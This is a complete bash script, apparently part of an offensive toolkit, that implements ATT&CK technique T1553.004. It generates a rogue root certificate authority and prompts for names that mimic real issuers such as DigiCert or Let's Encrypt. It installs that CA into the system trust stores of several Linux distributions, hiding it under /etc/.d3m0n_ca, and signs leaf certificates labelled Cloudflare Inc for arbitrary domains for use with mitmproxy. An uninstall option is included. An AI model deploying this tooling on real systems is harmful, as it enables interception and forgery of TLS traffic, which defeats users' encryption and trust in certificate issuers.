#!/bin/bash
#
# rogue_ca.sh — T1553.004 Install Root Certificate / Rogue CA
#
# Generate a rogue Certificate Authority, install it in the system
# trust store, and optionally generate leaf certificates for MITM.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

CA_DIR="/etc/.d3m0n_ca"
CA_KEY="${CA_DIR}/ca.key"
CA_CERT="${CA_DIR}/ca.crt"
CA_MARKER=".d3m0n_rogue_ca"

banner_rogue_ca() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1553.004 — Rogue Certificate Authority             ║"
    echo "  ║   Install rogue CA + generate MITM leaf certs         ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

check_openssl() {
    if ! command -v openssl &>/dev/null; then
        echo -e "${RED}[!] openssl required. Install: apt install openssl${NC}"
        return 1
    fi
    return 0
}

# ── [1] Generate rogue CA ──
generate_ca() {
    check_root || return 1
    check_openssl || return 1

    echo -e "${CYAN}[*] Generating Rogue Certificate Authority...${NC}"
    echo ""
    echo -e "${YELLOW}[?] CA Common Name (CN) — use something legitimate-looking:${NC}"
    echo -e "${YELLOW}    Examples: 'DigiCert Global Root G3', 'Let\\'s Encrypt R99'${NC}"
    read -r CA_CN
    CA_CN="${CA_CN:-System Trust Authority}"

    echo -e "${YELLOW}[?] Organization (O):${NC}"
    read -r CA_ORG
    CA_ORG="${CA_ORG:-Internet Security Research Group}"

    echo -e "${YELLOW}[?] Key size [default: 4096]:${NC}"
    read -r KEY_SIZE
    KEY_SIZE="${KEY_SIZE:-4096}"

    echo -e "${YELLOW}[?] Validity in days [default: 3650]:${NC}"
    read -r VALIDITY
    VALIDITY="${VALIDITY:-3650}"

    mkdir -p "$CA_DIR" 2>/dev/null
    chmod 700 "$CA_DIR"

    # Generate CA private key
    openssl genrsa -out "$CA_KEY" "$KEY_SIZE" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to generate CA key.${NC}"
        return 1
    fi
    chmod 600 "$CA_KEY"

    # Generate self-signed CA certificate
    openssl req -x509 -new -nodes -key "$CA_KEY" \
        -sha256 -days "$VALIDITY" -out "$CA_CERT" \
        -subj "/C=US/ST=California/O=${CA_ORG}/CN=${CA_CN}" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to generate CA certificate.${NC}"
        return 1
    fi

    echo -e "${GREEN}[+] Rogue CA generated!${NC}"
    echo -e "${YELLOW}  Key:  ${CA_KEY}${NC}"
    echo -e "${YELLOW}  Cert: ${CA_CERT}${NC}"
    echo -e "${YELLOW}  CN:   ${CA_CN}${NC}"
    echo -e "${YELLOW}  Valid: ${VALIDITY} days${NC}"

    # Show fingerprint
    local fp
    fp=$(openssl x509 -fingerprint -sha256 -noout -in "$CA_CERT" 2>/dev/null)
    echo -e "${YELLOW}  ${fp}${NC}"
}

# ── [2] Install CA to system trust store ──
install_ca() {
    check_root || return 1

    if [[ ! -f "$CA_CERT" ]]; then
        echo -e "${RED}[!] CA cert not found. Generate first (option 1).${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Installing rogue CA to system trust store...${NC}"

    local installed=0

    # Debian/Ubuntu
    if [[ -d /usr/local/share/ca-certificates ]]; then
        cp "$CA_CERT" "/usr/local/share/ca-certificates/${CA_MARKER}.crt"
        update-ca-certificates 2>/dev/null
        echo -e "${GREEN}  [+] Installed via update-ca-certificates (Debian/Ubuntu)${NC}"
        installed=1
    fi

    # RHEL/CentOS/Fedora
    if [[ -d /etc/pki/ca-trust/source/anchors ]]; then
        cp "$CA_CERT" "/etc/pki/ca-trust/source/anchors/${CA_MARKER}.crt"
        update-ca-trust extract 2>/dev/null
        echo -e "${GREEN}  [+] Installed via update-ca-trust (RHEL/Fedora)${NC}"
        installed=1
    fi

    # Arch
    if [[ -d /etc/ca-certificates/trust-source/anchors ]]; then
        cp "$CA_CERT" "/etc/ca-certificates/trust-source/anchors/${CA_MARKER}.crt"
        trust extract-compat 2>/dev/null
        echo -e "${GREEN}  [+] Installed via trust (Arch)${NC}"
        installed=1
    fi

    # SUSE
    if [[ -d /etc/pki/trust/anchors ]]; then
        cp "$CA_CERT" "/etc/pki/trust/anchors/${CA_MARKER}.crt"
        update-ca-certificates 2>/dev/null
        echo -e "${GREEN}  [+] Installed via update-ca-certificates (SUSE)${NC}"
        installed=1
    fi

    if [[ $installed -eq 0 ]]; then
        echo -e "${RED}[!] Could not determine trust store location.${NC}"
        echo -e "${YELLOW}[*] Manual install: copy ${CA_CERT} to your distro's CA trust directory.${NC}"
        return 1
    fi

    echo -e "${GREEN}[+] Rogue CA now trusted system-wide!${NC}"
    echo -e "${RED}[!] All TLS connections on this system now trust certificates signed by this CA.${NC}"
}

# ── [3] Generate leaf certificate for MITM ──
generate_leaf() {
    check_openssl || return 1

    if [[ ! -f "$CA_KEY" || ! -f "$CA_CERT" ]]; then
        echo -e "${RED}[!] CA not found. Generate first (option 1).${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Generate leaf certificate signed by rogue CA${NC}"
    echo ""
    echo -e "${YELLOW}[?] Domain(s) for the certificate (space-separated):${NC}"
    echo -e "${YELLOW}    Example: 'example.com www.example.com *.example.com'${NC}"
    read -r DOMAINS

    if [[ -z "$DOMAINS" ]]; then
        echo -e "${RED}[!] At least one domain required.${NC}"
        return 1
    fi

    local PRIMARY_DOMAIN="${DOMAINS%% *}"
    local CERT_DIR="${CA_DIR}/certs"
    local SAFE_NAME="${PRIMARY_DOMAIN//[\*.]/_}"
    mkdir -p "$CERT_DIR" 2>/dev/null

    local LEAF_KEY="${CERT_DIR}/${SAFE_NAME}.key"
    local LEAF_CSR="${CERT_DIR}/${SAFE_NAME}.csr"
    local LEAF_CERT="${CERT_DIR}/${SAFE_NAME}.crt"
    local LEAF_EXT="${CERT_DIR}/${SAFE_NAME}.ext"

    # Generate leaf key
    openssl genrsa -out "$LEAF_KEY" 2048 2>/dev/null
    chmod 600 "$LEAF_KEY"

    # Build SAN extension
    local SAN_ENTRIES=""
    local i=1
    for domain in $DOMAINS; do
        SAN_ENTRIES="${SAN_ENTRIES}DNS.${i} = ${domain}\n"
        i=$((i + 1))
    done

    cat > "$LEAF_EXT" << EXTEOF
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
$(echo -e "$SAN_ENTRIES")
EXTEOF

    # Generate CSR
    openssl req -new -key "$LEAF_KEY" -out "$LEAF_CSR" \
        -subj "/C=US/ST=California/O=Cloudflare Inc/CN=${PRIMARY_DOMAIN}" 2>/dev/null

    # Sign with CA
    openssl x509 -req -in "$LEAF_CSR" -CA "$CA_CERT" -CAkey "$CA_KEY" \
        -CAcreateserial -out "$LEAF_CERT" -days 365 -sha256 \
        -extfile "$LEAF_EXT" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to sign certificate.${NC}"
        return 1
    fi

    # Cleanup temp files
    rm -f "$LEAF_CSR" "$LEAF_EXT" "${CA_DIR}/ca.srl" 2>/dev/null

    echo -e "${GREEN}[+] Leaf certificate generated!${NC}"
    echo -e "${YELLOW}  Key:  ${LEAF_KEY}${NC}"
    echo -e "${YELLOW}  Cert: ${LEAF_CERT}${NC}"
    echo -e "${YELLOW}  Domains: ${DOMAINS}${NC}"
    echo -e "${YELLOW}  Valid: 365 days${NC}"
    echo ""
    echo -e "${YELLOW}[*] Use with MITM proxy: mitmproxy --cert ${LEAF_CERT} --cert-key ${LEAF_KEY}${NC}"
}

# ── [4] List certificates ──
list_certs() {
    echo -e "${CYAN}[*] Rogue CA Certificates:${NC}"
    echo "─────────────────────────────────────────────"

    if [[ ! -d "$CA_DIR" ]]; then
        echo -e "${YELLOW}  No rogue CA found.${NC}"
        return 0
    fi

    if [[ -f "$CA_CERT" ]]; then
        echo -e "${GREEN}  [CA]${NC}"
        openssl x509 -in "$CA_CERT" -noout -subject -issuer -dates 2>/dev/null | sed 's/^/    /'
        echo ""
    fi

    if [[ -d "${CA_DIR}/certs" ]]; then
        for cert in "${CA_DIR}"/certs/*.crt; do
            [[ -f "$cert" ]] || continue
            echo -e "${YELLOW}  [LEAF] $(basename "$cert")${NC}"
            openssl x509 -in "$cert" -noout -subject -dates 2>/dev/null | sed 's/^/    /'
            # Show SANs
            openssl x509 -in "$cert" -noout -ext subjectAltName 2>/dev/null | sed 's/^/    /'
            echo ""
        done
    fi

    # Check if installed in system trust
    echo -e "${CYAN}[*] System trust store status:${NC}"
    for loc in /usr/local/share/ca-certificates /etc/pki/ca-trust/source/anchors /etc/ca-certificates/trust-source/anchors /etc/pki/trust/anchors; do
        if [[ -f "${loc}/${CA_MARKER}.crt" ]]; then
            echo -e "  ${RED}[INSTALLED]${NC} ${loc}/${CA_MARKER}.crt"
        fi
    done
}

# ── [5] Uninstall ──
uninstall_ca() {
    check_root || return 1

    echo -e "${CYAN}[*] Removing rogue CA...${NC}"

    # Remove from trust stores
    for loc in /usr/local/share/ca-certificates /etc/pki/ca-trust/source/anchors /etc/ca-certificates/trust-source/anchors /etc/pki/trust/anchors; do
        if [[ -f "${loc}/${CA_MARKER}.crt" ]]; then
            rm -f "${loc}/${CA_MARKER}.crt"
            echo -e "${GREEN}  [+] Removed from: ${loc}${NC}"
        fi
    done

    # Update trust stores
    update-ca-certificates 2>/dev/null
    update-ca-trust extract 2>/dev/null
    trust extract-compat 2>/dev/null

    # Remove CA directory
    if [[ -d "$CA_DIR" ]]; then
        rm -rf "$CA_DIR"
        echo -e "${GREEN}  [+] Removed: ${CA_DIR}${NC}"
    fi

    echo -e "${GREEN}[+] Rogue CA removed and trust stores updated.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_rogue_ca
    echo -e "  ${CYAN}[1]${NC} Generate rogue CA"
    echo -e "  ${CYAN}[2]${NC} Install CA to system trust store"
    echo -e "  ${CYAN}[3]${NC} Generate leaf certificate (for MITM)"
    echo -e "  ${CYAN}[4]${NC} List certificates"
    echo -e "  ${CYAN}[5]${NC} Uninstall / Remove rogue CA"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) generate_ca ;;
        2) install_ca ;;
        3) generate_leaf ;;
        4) list_certs ;;
        5) uninstall_ca ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
